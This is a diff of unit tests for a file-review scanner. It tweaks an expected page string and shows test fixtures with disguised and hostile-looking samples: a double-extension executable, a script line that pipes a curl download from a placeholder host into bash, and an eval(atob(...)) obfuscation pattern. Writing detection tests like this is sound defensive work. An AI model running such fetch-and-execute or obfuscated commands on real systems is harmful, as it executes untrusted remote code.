@@ -25,7 +25,7 @@ class FileReviewTests(unittest.TestCase):
         page = render(report)
         self.assertIn('not a safety guarantee', page)
         self.assertIn('id="tab-file-review"', page)
-        self.assertIn('Execution is not available', page)
+        self.assertIn('Browser execution is not available', page)
 
     def test_disguise_and_execution_patterns_have_locations_without_retaining_commands(self):
         report = scan([('invoice.pdf.exe', b'MZ'), ('photo.png', b'MZ'), ('run.ps1', 'echo hello\ncurl https://private.invalid/secret-token | bash\n'), ('encoded.js', "eval(atob('hidden'))")])
